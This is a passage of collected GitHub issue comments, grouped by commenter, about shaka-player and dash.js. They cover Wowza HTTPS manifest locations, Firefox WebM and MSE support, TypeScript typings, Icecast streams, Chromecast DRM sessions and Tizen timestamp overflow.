sprint 2.6.1. Would be great if Shaka could provide a parallel implementation. . I can comment that dash.js is intended to be a performant production player and it is used by many companies in that role. It happens also to fulfill the function as the reference player for DASH IF, but that is an ancillary purpose and not the original reason I started the project. Support for MSS playback is evidence of this as it was a community requested feature. Support for HLS/CMAF would equally not be out of the question for dash.js :) If someone wants that, please go ahead and file and issue against our project. Jesus and Torbjorn have commented well on the latest feature set. I would only add \n\nThat IMSC1-text subtitle support is now reasonably robust and with the adoption of IMSC1-text by CMAF and  Apple, I have good hopes that we can finally coalesce around a single caption format. \nLow latency support using CMAF chunked encoding combined with chunked transfer delivery is in the oven and should be done in a sprint or two. \n\nFor those in Europe, we'll be holding a face-to-face meeting on dash.js in Berlin on Monday May 14th. It's free and kicks of Fraunhofer's week of Media . Lunch is included as well as dinner. It's open to any developer who works on MSE/EME. Even if shaka player is your focus, come by and meet a like-minded group of developers. \nCheers\nWill\n. ",
    "Ajaay": "Wow thanks for taking the time to write such a detailed, informative response! Really appreciate it.\nYou are right that these are purely single WebM files. To give you the full context, these are essentially generated by Webcam/Mic recordings using the MediaRecorder API, and saved to S3 in chunks at set intervals (say 5 seconds), all in browser. I expect recordings of up to an hour, so I save in chunks in an effort to avoid browser memory issues.\nWith regards to Option 1, I would know the total number of files and the sequence I'd want to play them in (numerical order). Would that be ok?\nAs for Option 2, if I could get this to work it would be the most ideal because it's all done in browser which really simplifies things. I struggled to get the timestampOffset feature to work, it just returned an error for me. However came across the 'sequence' mode option which gets the browser to adjust the timestamp automatically based on the order it's passed the segments. This partially worked in the sense that it played all of the chunks, but unfortunately the audio and video are completely muddled! And then there's the issue of Firefox where according to the specs WebM playback via MSE is only supported when hardware H.264 encoders are not available....Not really sure what that means and why.\nOption 3 and 4 seem a little out of my league to be completely honest.\nAnother option I've noticed is that AWS offer a transcoder service. Perhaps I could feed my S3 bucket as an input and have it spit out MPEG-DASH for me....\nThanks again.\n. I am able to play the WebM in Firefox just by opening the file URL, but when you try and play through MSE is when it fails. Here's the link:\nhttps://developer.mozilla.org/en-US/docs/Web/HTML/Supported_media_formats\nAnd the comment:\n[35] VP8/VP9 video codecs are only available in MSE when H.264 hardware decoders are not available. Checking for availability via MediaSource.isTypeSupported() is recommended.\nI don't get any helpful console errors in vanilla Firefox but in Nightly I get the following:\nCannot play media. No decoders for requested formats: video/webm; codecs=\"vorbis vp8\"\nSo it doesn't look good for FF unless I'm missing something.\nAs for Chrome yes I can play a single file no problem through MSE. The files are indeed small, currently 5 seconds but I can choose whatever I want the length to be. How would I go about creating the fake manifest parser?\nThanks\n. @joeyparrish , vp8 returns false and so does vp9. Whereas vorbis returns true. So is it looking like streaming any video in Firefox is a no go at the moment? Or would I need to transcode into something else first?\nPresumably streaming in Firefox using Shaka is a relatively common requirement?\n. 49.0.1 on OS X\n. I'm running a new Macbook Pro so a little surprised it's failed the benchmark test... However the fact it exists means I'll stick with Chrome playback for anything production for now. Good to know - thanks.\nIn terms of a fake manifest parser we're essentially talking about writing my own plugin as per the link below right?\nhttps://shaka-player-demo.appspot.com/docs/api/tutorial-plugins.html\n. ",
    "niklaskorz": "Hey Joey,\nthanks for the response.\nThe problem with the current restriction config is that it actually removes the tracks that do not meet the requirements. This results in not being able to select said track, although this might be desirable in certain scenarios.\nThe idea of this PR is to limit the tracks the ABR manager can switch to, without removing them from the selectable set of tracks entirely.\n. Exactly, yes.\n. Scenario:\nUser 1 has a netbook with a normal full HD display, running the video page of a 2160p video in windowed mode. This effectively means the video's viewport is at something like 850x540 pixels. User 1 is running on a gigabit connection, so normally shaka-player would give him the highest resolution available. The video output might look a bit off (it does) as the video is being downscaled live from a way higher resolution. For User 1, limiting the resolution to fit the viewport makes sense.\nNow why does it make sense that we can still select a resolution higher than the current viewport?\nUser 2 is running a 4k monitor, but has a slow 6mbit/s connection (looking at you, Comcast and Vodafone). He opens the video page and wants to prebuffer the 4k video, so he selects said quality level and goes away, eating breakfast or whatever he wants to do until the video has buffered enough data. Now if we limited the resolution to his viewport, he wouldn't be able to select a resolution higher than 720p. The user-unfriendly way would be to tell him that he has to put the video into fullscreen before being able to buffer the 4k resolution, ultimately destroying the possibility to do something different on the machine while it buffers the video.\n. We might be able to add this change as a configuration option to the abr config and apply it by filtering the needsUpdate map passed to the ABR manager. This should fit the design of shaka-player better.\n. I opened a new branch that might be more fitting for shaka-player:\nhttps://github.com/alugha/shaka-player/tree/feature-abr-resolution\n. Any comments on this? \n. Thanks for your response, @joeyparrish :)\nI fully agree that the current restriction set should only fulfill its original purpose.\nAs for your suggestions, I would opt for the first one, as an additional config object is more flexible (e.g., it would also allow user settings on the application's side) than enforcing the player's size. The third one would also be a possibility, but not really necessary as the program usually knows about any size changes happening to its video element, thus being able to apply them to the Shaka configuration if needed.\n. Would incorporating clutz be an option? I already wanted to try building TypeScript bindings for shaka-player using the clutz tool, but unfortunately I couldn't compile clutz successfully on neither macOS 13 nor Windows 10.. Thanks for the quick reply and the magnificent work you are doing on shaka-player. \ud83d\udcaf. So I have spent about a day writing type definitions for all exported shaka-player classes, interfaces, events and functions. It's complete and based on my understanding of both the shaka-player API docs and the TypeScript language. Doc comments are currently missing, but I'm considering to spent a bit of time there as well, copying the descriptions from the official API docs.\nI would be happy to provide a pull request, but I also understand that the shaka-player team may prefer an automated solution to a handwritten one. If this is the case and you do not want to officially support a handwritten version, I'm going to open a pull request on the DefinitelyTyped repository so us TypeScript-users can make use of these until officially supported typings exist.. Alright!\nDefinitely interested, I'll have a look in the coming days.. So I have spent a bit of time figuring out how the closure externs generator works and I am starting to get an idea of how the TypeScript generator could work. Will get back to you once I have something working. \ud83d\ude04 . Slowly getting there.\nThe result of a day's work: https://gist.github.com/niklaskorz/6ac5d1917024033e8b050afbd9677d68\nObviously quite a few things are still missing, like the types themselves (need to finish the correct formatting for that) or interfaces.. @yamass The problem is that shaka-player doesn't export its internal submodules as modules, they are only available as namespaces on the exported shaka object. If shaka-player happens to generate non-UMD modules in the future (i.e. ESNext or CommonJS), I see no problem in adding support for that to the typings generator.. ## Current progress:\nhttps://gist.github.com/niklaskorz/67d1a4931d503f6f40bcfc69a1dfa4c0\nWhat's still missing:\n\n[x] Investigate why Factory type definitions aren't translated to new interfaces as intended\n[ ] Declare native type names that are shadowed by shaka-player definitions as Native{Type} before declaration of shaka-player namespaces and use them instead where accurate\n[ ] Investigate if the configure parameter can be declared as a type-safe Partial<T>\n[ ] Add an option to define what namespace to export\n[ ] Investigate why shaka.text.TextEngine.prototype is declared as a namespace (same issue seems to appear in the externs generator)\n[x] Inherit param types for @override functions from extended / implemented interface\n[x] Support generics in class, interface and function declarations\n[x] Output rest / vararg types as arrays and prepend the ellipsis to parameter name instead of type (currently just puts the ellipsis in front of the vararg type)\n[x] Output array types as [] unless they are based on a type containing fields or unions\n[ ] If class has a base class, prefer base class for type inference over implemented interface\n[ ] Handle optional types and vararg ellipsis in function types (generateType)\n[ ] Treat undefined inside a function return type as void even if it's part of a union\n[ ] If a property of a typedef / interface / class includes a union with undefined as member, remove undefined from the union and mark the property as optional (prop?: T)\n[ ] If a typedef defines a function type, transform to a callable interface\n[ ] TypeScript uses two interfaces EventListener (function target) and EventListenerObject (object target) instead of a single EventListener interface, define a mapping for these differences\n[x] Move the processing logic done during writing the type definitions to the buildDefinitionTree module\n[ ] Verify that the generated type definitions are executable, perhaps by running them through the TypeScript compiler once\n[ ] Document all functions of the typedef generator tool (i.e. add doc comments)\n[ ] Test typings by using them in the alugha codebase. Let me get a few more tasks done first. \ud83d\ude04 . I'll be continuining the work at the end of next week. Lacking a bit of time this and last week due to University having started again.. I'll be back in the office starting May 7th and can finally finish this pull request then. Sorry for the delay!. @joeyparrish The event types are not included in the generated externs if I see that correctly. Would it be possible to include them? The alternative would be to either scan the source files for event types and generate types for them or to hand-write the type definitions for events and add them to the generated typedefs.. @FrancescoBorzi The rough work is done already. A few details are still to be done though: https://github.com/google/shaka-player/pull/1273#issuecomment-362840055. \n",
    "HeidiW": "Thanks @joeyparrish and @BucherTomas for the insights.\n. Apologies! Yes, please do close this.. ",
    "fdambrosio": "Hello, are you telling that Shaka can play mp3 audio-only files? \n. ",
    "Brahmasmi": "Joey, could you please elaborate on how one could play a *cast stream with audio-only data with single bit-rate media? This is assuming that the media source container and codec are supported on the user agent.\nI ask this because the basic usage tutorial (http://shaka-player-demo.appspot.com/docs/api/tutorial-basic-usage.html) suggests instantiating a Shaka Player instance with a video element and then loading the player with a manifest URI.\n1) From what I understand, a *cast stream may need an audio element since it does not contain any video. The Shaka.Player constructor (http://shaka-player-demo.appspot.com/docs/api/shaka.Player.html) requires an HTMLMediaElement. Would passing an audio element instead of a video one suffice?\n2)  A *cast stream does not really have a manifest, it only has a source URL. As such, for the player.Load function call, would passing the source URL instead of the manifest URI suffice?\nI am not proficient with javascript but can read and search code. I apologize in advance if this is an obvious case, and would request guidance on getting a working *cast audio only single bitrate setup.\n. Icecast is an open source streaming server, used by simple folks.\nDocumentation on Icecast - http://icecast.org/docs/\nSample streams - http://dir.xiph.org/\nUse case - Shaka Player plays live as well as on-demand Icecast streams on modern browsers using modern codecs and containers (opus in webm) with media source extensions (where present, no idea what to do with iOS Safari).\nOut of the above, I assume that Shaka does everything except Icecast streams.\nA typical usage could be (pseudo-code)\nplayer = shaka.player(srcURL)\nplayer.play()\nwhere srcURL is an Icecast source URL.\n(All content beyond this is based on limited to non-existent knowledge)\nFrom what I understand, DASH tried to solve the problem of network tuned content delivery by splitting content into various segments, which were denoted in MPD files. Shaka's current API requires manifest files. Shaka downloads these manifest files, parses it and then plays content based on network conditions and other factors.\nIcecast is actually very simple, single bitrate, no segments, and hence there is no MPD file. \\<start of non-existent knowledge> It is a direct stream, which is fetched using XHR/range-requests \\<end of non-existent knowledge>.\nUsually, simple HTML5 \\<audio> tags would suffice, except the fact that modern codecs and containers are not supported natively by most browsers. They do, however, support MSE based playback - case in point being Edge's support for opus in webm - https://blogs.windows.com/msedgedev/2016/04/18/webm-vp9-and-opus-support-in-microsoft-edge/.\nExoplayer for Android plays Icecast streams, so it may be possible that @vigneshvg might be able to help us throw more light on how Shaka could support Icecast streams.\nIf there are queries on the Icecast side, may be @epirat might be able to help us.. Thank you @joeyparrish and @ePirat for your insights - I went spelunking to understand whether there is anything that might help us. From what I understand, XHR is being superseded by the Fetch API. There is a streaming response body, which might probably help us.\n@jakearchibald - Could you please help us here - from what I understand from https://jakearchibald.com/2015/thats-so-fetch/#streams, the Fetch API has support for streaming response bodies. Would that help us solve the problem at hand - one that Joey has mentioned in the previous comment. For more background, I would request you to please refer to the issue and its comments.\nThanks.. The way I look at it, Shaka seems to be a counterpart to Exoplayer for android. The advantage of using Exoplayer is that it is a composable player, which allows one to build on top of well-tested robust reusable components.\nShaka has well tested components already present, and hence the request. There are a lot of horizontal challenges which have been already tackled, and more importantly, will continue to be tackled in Shaka. From what I can see, https://github.com/google/shaka-player/tree/master/lib/polyfill contains code that is non-trivial to write and maintain. Then there is the player state machine and Google Cast. I hope you would acknowledge that expecting a simple Fetch-linked-to-MediaSource-implementation to match Shaka's features and engineering quality would be a tough ask.\nI do not intend to offend you, but could I turn around your question of why Shaka to why not Shaka? If it is simple, then may be, just may be, it can be accomplished within Shaka.\nI do understand that Shaka is currently designed and implemented as an adaptive bit-rate javascript player. However, I also understand that there seems to be some kind of composability in Shaka. I base this on https://github.com/google/shaka-player/tree/master/lib/net where the http_plugin allows network based playback using XHR, while data_uri_plugin plays back data URIs.\nUnfortunately, I am not native to Javascript and as such, I am in no position to contribute from the code side. Frankly, coming from a strongly typed language, I have a lot of respect for folks who write quality code in javascript.\nHaving said all of the above, I will completely understand if you do not wish to add Icecast to your roadmap. I can understand that some of the adaptive bitrate design assumptions may be present throughout the code, and the refactoring risk may not be in the best interests of your primary customers. Additionally, the team may be short on time and/or bandwidth or facing non-trivial constraints.. Thanks Joey for your elaborate explanation. You have not been rude, in fact, you have been very supportive and understanding. You have given this feature request a patient consideration. I was worried that I might come across as offensive, and hence my disclaimer.\nFrom what I understand from your response, Shaka core is completely built on the design assumption of adaptive playback, with some degree of composability in peripheral components. I completely understand that putting Icecast on the roadmap is not feasible for the team. As such, for all practical purposes, this feature request can be closed.\nWith regards to the options, for someone with no knowledge of production quality javascript, the first option seems most attractive - adapt to the interface and hope for the best. Having said that, the last option is what would be correct, since the core architecture's evolution may not always agree with Icecast and keeping up with the retrofitting would be a maintenance challenge.\nThank you all for your time, patience and help.. ",
    "stjernstrom": "I think the manifest is the problem. If you check your manifest you will see that Location in the manifest points to http://\ncurl -v \"https://media.mojemedicina.cz:1936/vod/videos/smil:2015_ipad_petr_mara/manifest.mpd\"\nManifest returns:\n<Location>http://media.mojemedicina.cz/vod/videos/smil:2015_ipad_petr_mara/manifest_w788402249.mpd</Location>\n. What version of Wowza are you using? We are running WowzaStreamingEngine/4.5.0 and our Manifest looks OK, with HTTPS. I think the player is doing the correct thing, loading manifests/chunks from HTTP, since the manifest is pointing to that with Location.\nHow does the manifest look if you change your port to be on the normal 443 HTTP port?\n. I saw that you have wowza behind nginx. Sounds like the proxied traffic is transported over HTTP (which make sense) and therefor wowza detects it as a HTTP client. \nSince Wowza 4.5.x wowza has an option to hardcode the chunk domain name using \nFrom the release notes\n\nAdded HTTPStreamer String property \"mpegdashChunkHostDomain\", which modifies the domain name indicated in the MPD  tag. Allows content files to be located on a different server than the MPD manifest file\n\nMaybe you can use that to change to host/protocol?\n. ",
    "dosercz": "Manifest file is generated by wowza server, so I don't have way how to change it:( But same manifest works well in older version of shaka. Something changed in working with manifest in this version?\n. We are using wowza version 4.5.0.3. Yes, I agree with you, that there should be correct location and that it should be used by player.\nI could not check it on port 443, because there is running web server. But I have checked it with wowza stream lock certificate and with access over stream lock server, there is correct location with correct protocol and port (same as for you), so there is probably some problem with detection correct port and protocol on our wowza server. I will ask wowza support for help with it. Thanks!\n. I'll try it.\n. @joeyparrish this problem is not related to mixed content or cross origin requests;) it's about stream generation/interpretation...\n. Yes, I'm discussing it with wowza support.\n. Solved, protocol could be set in HTTPStreamer properties mpegdashPlaylistHostProtocol and mpegdashChunkHostProtocol. Port has to set in Host header on proxy.\n. ",
    "danpeters76": "We're seeing the same issue with 2.0.1 on Firefox 49.0.2 for streams generated by Unified Streaming Platform both for our own content and the sample content within the shaka demo player (Tears of Steel - Widevine). In both cases we've tested so far on OSX. \nThese streams are working fine using Shaka 2.0.1 on Chrome.\nSteps to replicate:\n1. Load a unified streaming platform generated stream\n2. Scrub to middle of video file\n3. In most cases video will pause and not restarting, throwing the warning \"The last segment should not end before the end of the Period.\" in the console.\n4. In some cases if you leave the file playback restarts 1 or 2 minutes later \nthanks,\nDan\n. ",
    "lgan1989": "hi @joeyparrish ,\nI have noted a pattern in the cases when we are able to reproduce the bug, that is during the loading period of first video, it's always creating an extra temporary sessions (right after the initial one), it results in sending out extra license request.\nWhen I look at the code in drm_engine.js, the following code seems to be used for avoid duplicated session: \n```javascript\n    if (Uint8ArrayUtils.equal(initData, this.activeSessions_[i].initData)) {\n      shaka.log.debug('Ignoring duplicate init data.');\n      return;\n    }\n```\nhowever, when I added a break point and inspect the data, I found that initData and this.activeSessions_[i].initData are most likely the same, but with a small portion of different value, so the Equal function here will consider they are different and it will allow it to create another session.\nI'm actually not sure if this is expected or not, but this seems to be the one that brings the hanging/buffering issue on Chromecast V1 (in V2, although it also creating two sessions at the beginning, no hang/buffering issue is seen), since After I update the code to use another function to check their equality, something like:\n```javascript\nshaka.util.Uint8ArrayUtils.mostLikelyeEqual = function(arr1, arr2) {\n  if (!arr1 && !arr2) return true;\n  if (!arr1 || !arr2) return false;\n  if (arr1.length != arr2.length) return false;\n  let c = 0;\n  let threshold = 30;\n  for (var i = 0; i < arr1.length; ++i) {\n    if (arr1[i] != arr2[i]) c ++;\n  }\n  return c <= threshold;\n};\n```\nThe issue on chromecast v1 is gone.\nIt now seems to be some hardware/firmware related issue, would like to hear some thoughts from you.\n. ",
    "ANNRYB": "Wrong PR\n. ",
    "JeffJassky": "Same thing happened here using a Widevine manifest. I (temporarily) got around it by programmatically setting video.currentTime=0.1 and it kicked right on playing.\n. Which OS and browser versions are you seeing this on?. ",
    "sridhardvvce": "@joeyparrish \nI have updated the code from git. \nIf I play the video 10 times, 9 times it plays successfully.\n1 or 2 times it fails to start when the play button is pressed. When we seek a little it starts playing.\n. ",
    "cheersalam": "It works fine on same machine on Chrome. It also fails on Firefox Developer Edition 52.0a2 (2016-11-26) (32-bit)\nHere are some console logs\n```\nhttp://vm2.dashif.org/livesim/utc_head/testpic_6s/A48/246672239.m4s [HTTP/1.1 404 Not Found 117ms]\nGET \nXHR \nhttp://vm2.dashif.org/livesim/utc_head/testpic_6s/V300/246672239.m4s [HTTP/1.1 404 Not Found 236ms]\nGET \nXHR \nhttp://vm2.dashif.org/livesim/utc_head/testpic_6s/V300/246672239.m4s [HTTP/1.1 404 Not Found 152ms]\nPlayer error Object { category: 1, code: 1001, data: Array[3], message: \"Shaka Error NETWORK.BAD_HTTP_STATUS\u2026\", stack: \"shaka.util.Error@http://shaka-playe\u2026\" }  main.js:190:3\n    shakaDemo.onError_ http://shaka-player-demo.appspot.com/demo/main.js:190:3\n    shakaDemo.onErrorEvent_ http://shaka-player-demo.appspot.com/demo/main.js:181:3\n    shaka.util.FakeEventTarget.prototype.dispatchEvent http://shaka-player-demo.appspot.com/lib/util/fake_event_target.js:114:9\n    shaka.cast.CastProxy.prototype.playerProxyLocalEvent_ http://shaka-player-demo.appspot.com/lib/cast/cast_proxy.js:517:3\n    shaka.util.FakeEventTarget.prototype.dispatchEvent http://shaka-player-demo.appspot.com/lib/util/fake_event_target.js:114:9\n    shaka.Player.prototype.onError_ http://shaka-player-demo.appspot.com/lib/player.js:1671:3\n    shaka.media.StreamingEngine.prototype.handleNetworkError_ http://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:1170:5\n    shaka.media.StreamingEngine.prototype.fetchAndAppend_/< http://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:1144:7\n(video:3) Network error. Retrying...  streaming_engine.js:1172:5\nGET \nXHR \nhttp://vm2.dashif.org/livesim/utc_head/testpic_6s/A48/246672239.m4s [HTTP/1.1 404 Not Found 267ms]\nPlayer error Object { category: 1, code: 1001, data: Array[3], message: \"Shaka Error NETWORK.BAD_HTTP_STATUS\u2026\", stack: \"shaka.util.Error@http://shaka-playe\u2026\" }  main.js:190:3\n(audio:1) Network error. Retrying...  streaming_engine.js:1172:5\nGET \nXHR \nhttp://vm2.dashif.org/livesim/utc_head/testpic_6s/V300/246672239.m4s [HTTP/1.1 404 Not Found 198ms]\nGET \nXHR \nhttp://vm2.dashif.org/livesim/utc_head/testpic_6s/A48/246672239.m4s [HTTP/1.1 404 Not Found 228ms]\nGET \nXHR \nhttp://vm2.dashif.org/livesim/utc_head/testpic_6s/V300/246672239.m4s [HTTP/1.1 404 Not Found 222ms]\nPlayer error Object { category: 1, code: 1001, data: Array[3], message: \"Shaka Error NETWORK.BAD_HTTP_STATUS\u2026\", stack: \"shaka.util.Error@http://shaka-playe\u2026\" }  main.js:190:3\n(video:3) Network error. Retrying...  streaming_engine.js:1172:5\nGET \nXHR \nhttp://vm2.dashif.org/livesim/utc_head/testpic_6s/A48/246672239.m4s [HTTP/1.1 404 Not Found 207ms]\nPlayer error Object { category: 1, code: 1001, data: Array[3], message: \"Shaka Error NETWORK.BAD_HTTP_STATUS\u2026\", stack: \"shaka.util.Error@http://shaka-playe\u2026\" }  main.js:190:3\n(audio:1) Network error. Retrying...  streaming_engine.js:1172:5\nGET \nXHR \nhttp://vm2.dashif.org/livesim/utc_head/testpic_6s/V300/246672239.m4s [HTTP/1.1 404 Not Found 220ms]\nGET \nXHR \nhttp://vm2.dashif.org/livesim/utc_head/testpic_6s/A48/246672239.m4s [HTTP/1.1 404 Not Found 236ms]\n```\n. Thanks @joeyparrish working fine now on Firefox both on windows and Ubuntu. ",
    "izar89": "I just tested this on macbook pro (El capitan) and default firefox(dev) v52.0a2 and I also get a Shaka Error NETWORK.BAD_HTTP_STATUS (http://vm2.dashif.org/livesim/utc_head/testpic_2s/V300/740853105.m4s,404,Request for 740853105.m4s was 7400.4s too late )\n\nThe weird thing is that I only get the network error when my dev tools are closed. When the dev tools are open it loads and works fine.Tested this multiple times.\nIn safe mode I also get the same result.\n\nNormal Firefox v50.1 loads and plays normal with and without dev tools and safe mode\n. I just tested this on macbook pro (El capitan) and default firefox(dev) v52.0a2 and I also get a Shaka Error NETWORK.BAD_HTTP_STATUS (http://vm2.dashif.org/livesim/utc_head/testpic_2s/V300/740853105.m4s,404,Request for 740853105.m4s was 7400.4s too late )\n\n\nThe weird thing is that I only get the network error when my dev tools are closed. When the dev tools are open it loads and works fine.Tested this multiple times.\n\nIn safe mode I also get the same result.\nNormal Firefox v50.1 loads and plays normal with and without dev tools and safe mode\n. I don't know if this is related but you can force start the video after it gets stuck when you set the video.currentTime to something higher then 0. When you do that the currentTime starts counting down for a few ms before counting up?\nloaded\n0 / 49 (video.currentTime / video.duration) <--- stuck\n------------------ video.currentTime = 16.078125 <--- force start\n16.076124999999998 / 49\n16.075124999999996 / 49\n16.074124999999995 / 49\n16.073124999999994 / 49\n16.072124999999993 / 49\n16.07112499999999 / 49\n16.07012499999999 / 49\n16.06912499999999 / 49\n16.068124999999988 / 49\n16.068124999999988 / 49\n16.067124999999987 / 49\n.... @ckelsey, I also get the Shaka network error. When trying https://d1g1aamoxberjq.cloudfront.net/dash/sintel-1.mpd with the shaka-player demo. When trying with http://mediapm.edgesuite.net/dash/public/nightly/samples/dash-if-reference-player/index.html I get No 'Access-Control-Allow-Origin' header is present on the requested resource.. Ik got the same results on mac in Firefox and Safari as @cpeterso. Same error messages. Chrome works fine.\n\n@ckelsey Did you by chance copy the wrong video file because you're video dimensions don't match the video file referenced in you're manifest file. I tested the shaka-packager with the following video file: http://peach.themazzone.com/durian/movies/sintel-1280-surround.mp4 and code \npackager \\\n  input=sintel-1280-surround.mp4,stream=audio,output=sintel_audio.mp4 \\\n  input=sintel-1280-surround.mp4,stream=video,output=sintel_video.mp4 \\\n--profile on-demand \\\n--mpd_output sintel_vod.mpd\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!--Generated with https://github.com/google/shaka-packager version d8d94da-release-->\n<MPD xmlns=\"urn:mpeg:dash:schema:mpd:2011\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" xsi:schemaLocation=\"urn:mpeg:dash:schema:mpd:2011 DASH-MPD.xsd\" xmlns:cenc=\"urn:mpeg:cenc:2013\" minBufferTime=\"PT2S\" type=\"static\" profiles=\"urn:mpeg:dash:profile:isoff-on-demand:2011\" mediaPresentationDuration=\"PT888.064S\">\n  <Period id=\"0\">\n    <AdaptationSet id=\"0\" contentType=\"video\" width=\"1280\" height=\"544\" frameRate=\"24/1\" subsegmentAlignment=\"true\" par=\"40:17\">\n      <Representation id=\"0\" bandwidth=\"1618173\" codecs=\"avc1.64001f\" mimeType=\"video/mp4\" sar=\"1:1\">\n        <BaseURL>sintel_video.mp4</BaseURL>\n        <SegmentBase indexRange=\"811-1730\" timescale=\"24\">\n          <Initialization range=\"0-810\"/>\n        </SegmentBase>\n      </Representation>\n    </AdaptationSet>\n    <AdaptationSet id=\"1\" contentType=\"audio\" lang=\"en\" subsegmentAlignment=\"true\">\n      <Representation id=\"1\" bandwidth=\"442355\" codecs=\"mp4a.40.2\" mimeType=\"audio/mp4\" audioSamplingRate=\"48000\">\n        <AudioChannelConfiguration schemeIdUri=\"urn:mpeg:dash:23003:3:audio_channel_configuration:2011\" value=\"6\"/>\n        <BaseURL>sintel_audio.mp4</BaseURL>\n        <SegmentBase indexRange=\"742-1841\" timescale=\"48000\">\n          <Initialization range=\"0-741\"/>\n        </SegmentBase>\n      </Representation>\n    </AdaptationSet>\n  </Period>\n</MPD>\n- http://stijnheylen.com/sintel/sintel_vod.mpd\n- This seems to work in chrome and firefox. (local)(firefox keeps loading online, related to my initial problem?).\n- In safari the player is stuck at the first frame, but plays after clicking the time bar. (also related to my initial problem?)\n- no warnings, no errors. @joeyparrish Just tested the nightly build with the following links:\n1) http://nightly.shaka-player-demo.appspot.com/demo/?asset=https://s3-us-west-2.amazonaws.com/cklsymedia/dash/sintel-2.mpd;play\n2) http://nightly.shaka-player-demo.appspot.com/demo/?asset=http://stijnheylen.com/shakaTest/video/animated-font/animated-font.mpd;play\n\nThe first link works for me in Firefox(dev v52.0a2) but fails to start in safari(v9.1.3) (manifest and segments are loaded).\nThe second link (manifest on my server) sometimes works in Firefox (fails to start when dev tools are closed? Only thing I can think of is cache related?) and also fails to start in safari.\nCleared cache, tried safe mode. Force starting it with the playback bar works, if I drag the playback bar back to 0 it gets stuck again. Still playback issue?\n. Ok, thanks for the info! video.currentTime = 0.1 seems to fix both firefox and safari \ud83d\udc4d . \n",
    "alam-bline": "How can I prevent this from happening if I use Shaka Player as a library?. Got it. thanks. ",
    "TobbeEdgeware": "The caching headers have been fixed on http://vm2.dashif.org/dash/time.txt. Thanks for finding the issue. . I think this is mainly an issue when translating from TTML to WebVTT (VTTCue). WebVTT does not have different white-space modes, and since it is line-based, it is natural to start the text at the beginning of every line. It is thus not likely that the VTTCue API will ever have a white-space API.\nI therefore think that your willingness to let this be implemented in the TTML parsing in Shaka Player is the correct choice.. @ismena Sounds good. I let you know, if I start working on it.. We should not write that this introduces extra latency, because segments are still generated directly when we have the corresponding data. For HLS, one should notice no difference.\nIt is rather a possible shift between incoming media time and outgoing media time, to make sure that we don't generate DASH segments too late according to wall-clock.. @joeyparrish I'm terribly sorry. The remark was for another project, and somehow I had this old page open and typed it here by mistake. The ticket should remain closed.. We will get back with a PR with another commit account, that is included in the CLA.. Hi @sandersaares, seems that you're correct about #1232 referring to the same issue. At least, I'm contributing with a new asset and some more arguments that there is indeed a bug in the code.. What comest to my mind is that dash.js has support for more subtitles/captions formats than shaka, namely:\n) embedded CEA-608 captions\n) IMSC-1 image subtitles as separate representations\n@dsparacio and @wilaw, do you want to add some features to the comparison list?. We are also using MPD redirect as our main way of handling sessions and it is working in all other clients, so we'd like this to be supported  in 2.5.0. Using the \\<Location> element in the MPD is a fallback, but requires manifest rewrite so it is heavier.. @vaage Sounds good. I'm on vacation until Aug. 6, but will try to look at this right when I'm back if not sooner.. @vaage I agree that the problem is gone (tested in version 2.4.3). In Chrome 68, I can still see the issue in 58d1498 but not in version 2.4.3. Thus, you can close this issue.. By using the possibility to change the availabilityStartTime (AST) of the DASH-IF live-source-simulator, it was possible to pinpoint that there is no audio playout when AST is older than 49.7 days.\nThe URLs look like\nhttps://livesim.dashif.org/livesim/segtimeline_1/start_1538352000/testpic_2s/Manifest.mpd\nor \nhttps://livesim.dashif.org/livesim/start_1538352000/testpic_2s/Manifest.mpd\nwhere 1538352000 is the number of seconds since epoch start (1970-01-01) (in this case it corresponds to 2018-10-01T00:00:00Z which is too old).\nThe 49.7days is very close to 2**32 milliseconds, so it is likely that there is an overflow bug in the player.\nThis bug means that no DASH live server can have a  continuous working service for more than 49.7 days since the AST value is not allowed to change during a DASH session.\nIn any case, I think we can exclude that this issue is due to a bug in Shaka-player.\n. @joeyparrish It must be in the Tizen media stack.\nMy guess is that the media time (time in DASH segments relative to AST) is converted into milliseconds in the media stack (although the timescale in the media itself is 48000 or similar).\nI agree with you that it may be worth to see if one can shift the timestampOffset in the SourceBuffer with something like the session start time to get around the issue.\nIf that does not work, it should be possible to do a corresponding shift in the baseMediaDecodeTime in the tfdt box to bring the timestamps close to zero (essentially the same thing, but before the SourceBuffer).\nYou may then want to add the offset back when reporting the playback progress in order to report the correct DASH media time.. @joeyparrish Thanks for your efforts. It seems to be too much trouble to make a consistent behaviour when shifting the timestamps, so it should better be fixed in Tizen.\nWe have a newer segmenter where we can change the AST to an arbitrary value, which should make it possible to run the service with unpatched Tizen for at least a month before changing AST.\nRegarding your comment about 53-bit Javascript integer precision, we are aware that it is an issue when using the 10,000,000 timescale of SmoothStreaming. That is the reason that we use 2000-01-01 as AST instead of 1970-01-01. With the 2000-01-01 AST, the source plays nicely in Shaka-player on other platforms.. @theodab I think there is some confusion here about the type of manifest.\nSegmentTimeline can be used with $Time$ or $Number$.\nIn this case, $Time$ is used and startNumber is not relevant at all.\nIn the case of $Number$, the MPD needs a startNumber attribute in the SegmentTemplate.\nThe difference can be seen on DASH-IF dash-live-source-simulator, where I just added the $Number$ version on the dev version.\n$Time$: https://livesim.dashif.org/livesim/segtimeline_1/testpic_2s/Manifest.mpd\n$Number$: https://livesim.dashif.org/livesim-dev/segtimelinenr_1/testpic_2s/Manifest.mpd\nAdding number is one way to solve this issue, but Shaka-player should also work with this URL for $Time$.\nIn fact, we have been running this content,\nhttps://moln.edgeware.tv/__cl/cg:ibc/__c/ibc2018/__op/default/__f/Manifest.mpd\nwith Shaka-player during the full IBC show in September, and I have a compiled version that still works fine.\nHowever, it does not work well with with the 2.3-master version, 2.4-master or 2.5.0-beta.\nIt is an assert in segment_index.js on line 169 (v2.5.0-beta) that fires\ngoog.asserts.assert(r2.endTime > r1.endTime &&\n            i == this.references_.length - 1 &&\n            j == references.length - 1,\n            'This should be an update of the last segment in a period'); \nThe URL is IP-address blocked, but I'd be happy to open it up if you want to investigate this further. I can also provide a link to the compiled shaka-player that works.. All of the sudden things are working in 2.5.0-beta in Chrome 70 an in Safari 12.0.1 on my Mac running High Sierra. The content now plays nicely for 10 minutes which is about 20 period boundaries. I have not touched the source, nor the Shaka-player code.\nSo it seems that something is unstable, but I don't know what. I saw a similar behavior a couple of days ago as our canned demo with this source worked on one Mac, but not another, although having the same Chrome and OS 